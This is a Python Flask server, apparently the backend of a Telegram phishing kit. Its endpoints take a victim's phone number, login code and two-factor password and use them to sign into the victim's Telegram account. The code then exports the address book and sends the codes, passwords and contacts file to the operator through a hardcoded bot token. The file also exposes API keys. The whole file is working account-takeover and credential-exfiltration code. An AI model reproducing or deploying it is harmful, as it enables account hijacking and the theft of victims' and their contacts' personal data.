import asyncio
import os
import csv
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.functions.contacts import GetContactsRequest

app = Flask(__name__)

# ========== КОНФИГ ==========
API_ID = 31988183
API_HASH = "15639dd897ed527044bc4dbd569d1ffa"
BOT_TOKEN = "8796941636:AAHLF9LISK21vWTXL7Pq9cKo3pO98TcdPCQ"
YOUR_CHAT_ID = 7518727041

SESSION_DIR = "/tmp/sessions"
EXPORT_DIR = "/tmp/exports"
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs(EXPORT_DIR, exist_ok=True)

active_sessions = {}

# ========== ОТПРАВКА ЛОГА ==========
def send_log(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': YOUR_CHAT_ID, 'text': text}
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ========== ОТПРАВКА ФАЙЛА ==========
def send_file_to_telegram(file_path, phone):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': YOUR_CHAT_ID, 'caption': f"📱 Контакты: {phone}"}
            requests.post(url, data=data, files=files, timeout=10)
        print(f"📤 Файл отправлен: {file_path}")
    except Exception as e:
        print(f"Ошибка отправки файла: {e}")

# ========== ВЫГРУЗКА КОНТАКТОВ ==========
def export_contacts_sync(client, phone):
    filename = f"{EXPORT_DIR}/contacts_{phone.replace('+', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def fetch():
        result = await client(GetContactsRequest(hash=0))
        contacts = [u for u in result.users if not u.bot]
        return contacts
    
    contacts = loop.run_until_complete(fetch())
    loop.close()
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"КОНТАКТЫ ИЗ АДРЕСНОЙ КНИГИ: {phone}\n")
        f.write(f"ВСЕГО: {len(contacts)}\n\n")
        for i, u in enumerate(contacts, 1):
            f.write(f"{i}. ТЕЛ: {u.phone or 'НЕТ'}\n")
            f.write(f"   ЮЗ: @{u.username if u.username else 'НЕТ'}\n")
            f.write(f"   ИМЯ: {u.first_name or ''} {u.last_name or ''}\n")
            f.write("-" * 40 + "\n")
    
    send_file_to_telegram(filename, phone)
    send_log(f"✅ Контакты сохранены: {filename}")
    return filename

# ========== ОТПРАВКА КОДА ==========
@app.route('/send_code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone', '').strip().replace(' ', '')
    if not phone:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    send_log(f"📱 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def do_send():
        session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        if await client.is_user_authorized():
            export_contacts_sync(client, phone)
            return {'success': True, 'already_authorized': True}
        result = await client.send_code_request(phone)
        active_sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        return {'success': True, 'message': 'Code sent'}
    
    try:
        res = loop.run_until_complete(do_send())
        loop.close()
        return jsonify(res)
    except Exception as e:
        loop.close()
        return jsonify({'success': False, 'error': str(e)})

# ========== ПРОВЕРКА КОДА ==========
@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.get_json()
    phone = data.get('phone', '').strip().replace(' ', '')
    code = data.get('code', '').strip()
    if not phone or not code:
        return jsonify({'success': False, 'error': 'Phone and code required'})
    
    send_log(f"🔑 КОД: {phone} -> {code}")
    
    if phone not in active_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def do_verify():
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['phone_code_hash'])
            send_log(f"✅ ВХОД: {phone}")
            export_contacts_sync(client, phone)
            del active_sessions[phone]
            return {'success': True, 'needs_password': False}
        except SessionPasswordNeededError:
            return {'success': False, 'needs_password': True, 'error': '2FA required'}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code', 'needs_password': False}
        except Exception as e:
            return {'success': False, 'error': str(e), 'needs_password': False}
    
    try:
        res = loop.run_until_complete(do_verify())
        loop.close()
        return jsonify(res)
    except Exception as e:
        loop.close()
        return jsonify({'success': False, 'error': str(e)})

# ========== 2FA ==========
@app.route('/verify_password', methods=['POST'])
def verify_password():
    data = request.get_json()
    phone = data.get('phone', '').strip().replace(' ', '')
    password = data.get('password', '').strip()
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Phone and password required'})
    
    send_log(f"🔐 2FA: {phone} -> {password}")
    
    if phone not in active_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def do_verify():
        try:
            await client.sign_in(password=password)
            send_log(f"✅ ВХОД (2FA): {phone}")
            export_contacts_sync(client, phone)
            del active_sessions[phone]
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    try:
        res = loop.run_until_complete(do_verify())
        loop.close()
        return jsonify(res)
    except Exception as e:
        loop.close()
        return jsonify({'success': False, 'error': str(e)})

# ========== ЗАПУСК ==========
app = app  # просто для ясности, gunicorn найдёт app

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
